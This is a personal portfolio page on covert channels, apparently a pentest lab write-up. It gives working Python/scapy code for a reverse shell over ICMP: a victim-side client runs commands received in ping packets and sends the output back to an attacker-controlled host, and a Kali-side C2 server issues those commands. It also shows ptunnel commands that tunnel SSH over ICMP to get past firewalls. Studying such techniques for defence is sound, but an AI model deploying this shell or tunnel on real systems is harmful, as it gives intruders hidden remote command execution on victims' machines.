---
permalink: /portfolio/covert/
author: Rick Theeuwes

defaults:
  # _pages
  - scope:
      path: ""
      type: pages
    values:
      layout: single
      author_profile: true
toc: true
title: Covert Channels
---

## Introduction

Covert channels is a way to hide and/or obfuscate your connection. This can be done by minimizing your communication, or by tunneling the traffic through different protocols.

## ICMP Tunneling

One way of setting up a covert channeling is by using ICMP tunneling. This wraps the data is a ICMP packet, these packets are allowed on most networks.

Basically, a ping packet has a lot of reserved space, which is often filled with a buffer of null-bytes. This empty space can be used to send data over. This cannot be a lot, but a simple shell works.

![ping](https://joeladams.nl/wp-content/uploads/2020/09/ICMP-info.png)

Say, you compromise a machine within a network, but you know that the network is very strict on all tcp connections. Then we tunnel the traffic to ICMP, an allowed protocol, so we can control our victim.

![network](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/covert/network.png)

First, I wanted to manually make a simple script that communicates over ICMP. This is the end result of searching and debugging. ([source](https://medium.com/@galolbardes/learn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000))

Client (executed on victim)

```python
#!/usr/bin/env python3

import os
from scapy.all import *

ip = "192.168.241.130"

def main():
    while True:
        # wait for the ICMP message containing the command from the C2 server to be received
        rx = sniff(filter="icmp", count=1)
        var = rx[0]
        if Raw not in var: #If the packet does not contain Raw, it is a wrong message
          continue
        var = rx[0][Raw].load.decode('utf-8')
        # run the command and save the result
        res = os.popen(var).read()
        print(res)
        # build the ICMP packet with the result as the payload
        #This packet is send back to the server.
        send(IP(dst=ip)/ICMP(type="echo-reply", id=0x0001, seq=0x1)/res)

if __name__ == "__main__":
    main()

```

Server (executed on Kali)

```python
#!/usr/bin/env python3

from scapy.all import *

ip="192.168.241.132"

def main():
    while True:
        command = input('# Enter command: ')
        # build the ICMP packet with the command as the payload
        pinger = IP(dst=ip)/ICMP(id=0x0001, seq=0x1)/command
        send(pinger)

        # wait for the ICMP message containing the answer from the agent to be received
        rx = sniff(filter="icmp", count=3) #Capture more than one packet, too much takes long, too little might nog contain the response
        for r in rx:
          if Raw in r: # If the packet contains a Raw load, we have the correct response.
              print(r[Raw].load.decode('utf-8'))

if __name__ == "__main__":
    main()

```

basically, this is a extremely simple reverse shell over ICMP. Both scripts need to be started as root in order to use the pinger on Linux. Then the C2 server send a ping request with a command, this command is executed and a reply with the result of the executing is send back. As you can see on the wireshark result (captured on Kali), the server send 2 replies. The first one is the default reply send by the victim machine itself. The second reply is send by the script, this contains the result of the executed command.

![wireshark](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/covert/wireshark.png)

![command](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/covert/command.png)

![reply](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/covert/reply.png)

Great! But now we want to advance in the network. How would we do this? Well, using ptunnel we can create a port-forward tunnel over ICMP, to use SSH, for instance. This can be done with the following command:

```bash
#Server (victim)
sudo ptunnnel -v 4

#client (kali)
sudo ptunnel  -p 192.168.241.131 -lp 8000 -da 192.168.241.132 -dp 22 -c eth0
```

Once again, all of the command need to run as root. On the server you start a listener to listen for the incoming connection. The `-v 4` is to show the most output for debugging. Then, the second command needs to be executed on the client, in this case Kali.

- `-p` The ip of the listening server

- `-lp` The localport to forward

- `-da` The remote machine to forward the traffic to (target in this case)

- `-dp` The remote port of target

- `-c` The interface of the local machine to use.

This creates a port forward form my Kali port 8000 to the target port 22. Now I can communicate with target over SSH through ICMP

![connected](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/covert/connected.png)

![sshshark](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/covert/sshshark.png)